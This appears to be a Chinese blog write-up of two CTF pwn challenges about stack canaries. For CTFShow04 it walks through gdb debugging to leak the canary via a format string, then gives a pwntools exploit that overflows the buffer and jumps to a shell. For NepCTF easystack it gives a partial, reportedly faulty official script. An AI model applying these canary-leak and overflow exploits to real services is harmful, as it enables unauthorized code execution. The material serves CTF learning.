---
title: Canary
categories: 
    - Stack
    - Canary
---

# canary

<!--more-->

### CTFShow04

先checksec

![在这里插入图片描述](https://img-blog.csdnimg.cn/2020100514433593.png#pic_center)

栈不可执行
Canary打开

> canary:
用于防止栈溢出被利用的一种方法，原理是在栈的ebp下面放一个随机数，在函数返回之前会检查这个数有没有被修改，就可以检测是否发生栈溢出。

main函数：

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201005144542442.png#pic_center)

没有线索，跟进vuln函数

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201005144639881.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center)

看到v3就是canary了
也就是下面的 [ebp-0ch]

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201005145903257.png#pic_center)

在vuln函数中canary赋值给了eax
我们可以通过在这个赋值之后下一个断点，来获取canary的值
在此之前我们需要知道printf函数的地址，用来找到canary的偏移
所以要先在printf函数下面下一个断点
`b printf`

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201005150508325.png#pic_center)

`run`

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201005152146251.png#pic_center)

可以看到
printf函数的地址是 0xffffd0b0

然后在canary赋值之后下一个断点
ps：在vuln函数和main函数中都有canary的赋值

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201005151100579.png#pic_center)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201005151126582.png#pic_center)

这里需要用main函数里面的（我也不知道为什么。。。
`b *0x080486C9`

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201005152008443.png#pic_center)

这样就找到了canary的值
之后看printf的地址，找到canary的值，然后算出偏移
`x/40wx 0xffffd0b0`

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201005151654295.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center)

发现0x0x1276e500的偏移为31，所以构造canary的值为%31$x
canary的值要靠我们的输入buf来赋值，所以要计算一下buf和v3的偏移 = (0x70-0xC) =100

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201005153200798.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center)

最后还有 (0x8+4) = 12 个字节需要覆盖，覆盖返回地址到system函数才能取得shell

exp：

```python
from pwn import *

p =remote("111.231.70.44",28017)

p.recv()
leak_canary = "%31$x"
p.sendline(leak_canary)
canary = int(p.recv(),16)

print(hex(canary))

getshell = "a" * 100 + p32(canary) + "b" * 12 + p32(0x0804859B)

p.sendline(getshell)

p.interactive()
```




### NepCTF easystack （未解决）

2021.3.25

[参考](https://blog.csdn.net/qq_51868336/article/details/115156308?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161656332316780261939739%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161656332316780261939739&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~times_rank-2-115156308.first_rank_v2_pc_rank_v29&utm_term=NepCTF)


目前看不太懂。。。

官方WriteUp：
```py
from pwn import *
context.log_level = 'debug'
p= process("./easystack")
#p=remote("node2.hackingfor.fun",'30784')
exp = 0x30*p64(0x6cde20)
p.sendline(exp)
p.recv()
p.interactive()

```
0x30应该是0x3a。。。。。不然跑不起来，不知道这个数字怎么来的。。。




